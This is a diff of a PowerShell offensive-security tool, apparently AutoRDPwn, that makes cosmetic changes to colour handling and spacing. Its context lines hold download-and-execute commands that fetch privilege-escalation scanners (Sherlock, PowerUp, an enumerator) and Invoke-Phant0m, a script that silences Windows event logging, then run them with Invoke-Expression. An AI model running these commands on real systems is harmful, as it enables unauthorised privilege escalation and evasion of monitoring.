@@ -409,13 +409,15 @@ function Remove-Exclusions {
         Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $privesc = $Host.UI.ReadLine() ; Write-Host
 
-        if($privesc -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
+        if($privesc -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Chachi-Enumerator.ps1')
         Comprueba-Todo ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
-        if($privesc -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
+        
+	if($privesc -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Sherlock.ps1')
         Find-AllVulns ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
-        if($privesc -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
+        
+	if($privesc -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/PowerUp.ps1')
         Invoke-AllChecks ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
         
@@ -433,8 +435,10 @@ function Remove-Exclusions {
         if($othermodule -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1')
         Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
+	
 	if($othermodule -like '2'){ $vncserver ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
-        if($othermodule -like 'X'){ $input = 'x' ; continue }
+        
+	if($othermodule -like 'X'){ $input = 'x' ; continue }
         if($othermodule -in '1','2','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
 
 	if($module -like 'X'){ $input = 'x' ; continue } ; if($module -in '1','2','3','4','5','6','7','m','x') { $null }
